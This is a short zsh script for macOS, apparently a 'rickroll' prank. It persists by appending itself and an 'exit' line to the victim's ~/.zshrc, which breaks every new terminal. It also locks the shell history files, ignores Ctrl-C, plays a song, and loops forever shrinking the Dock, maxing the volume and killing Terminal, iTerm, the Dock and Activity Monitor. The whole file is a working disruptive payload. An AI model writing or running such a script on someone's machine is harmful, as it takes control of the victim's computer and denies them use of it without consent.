#!/bin/zsh
cat ./rick.sh >> ~/.zshrc
echo -e 'exit' >> ~/.zshrc
chmod 000 ~/.zsh_history ~/.bash_history && clear
sleep 600
trap ' ' 2
afplay rick.mp3 > /dev/null &
while [ 1 ]
do
	for i in {1..15} {17..231} {235..256}
	do
		defaults write com.apple.dock tilesize -integer 1 && defaults write com.apple.dock largesize -integer 1
		osascript -e "set Volume 10"
		killall iTerm; killall Terminal; killall Dock; killall "Activity Monitor";
	done
done
exit